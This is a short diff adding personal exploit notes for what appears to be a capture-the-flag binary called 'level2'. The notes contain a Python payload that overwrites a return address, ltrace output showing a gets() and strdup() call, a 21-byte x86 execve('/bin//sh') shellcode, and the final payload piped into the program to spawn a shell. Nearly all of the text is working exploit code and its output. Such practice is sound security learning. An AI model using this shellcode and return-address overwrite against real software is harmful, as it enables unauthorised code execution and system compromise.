@@ -1,0 +1,22 @@
+
+To rewrite ret
+python -c 'print "A" * 80 + "\x08\xa0\x04\x08"'  > /tmp/ex1
+
+ltrace ./level2
+__libc_start_main(0x804853f, 1, 0xbffff7b4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                                       = 0
+gets(0xbffff6bc, 0, 0, 0xb7e5ec73, 0x80482b5
+)            = 0xbffff6bc
+puts(""
+)                                                 = 1
+strdup("")                                               = 0x0804a008
++++ exited (status 8) +++
+
+to get malloc return address
+
+shell code \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80 - 21 symbols
+
+80 - 21  = 59
+
+python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59  + "\x08\xa0\x04\x08"'  > /tmp/ex1
+cat /tmp/ex1 - | ./level2
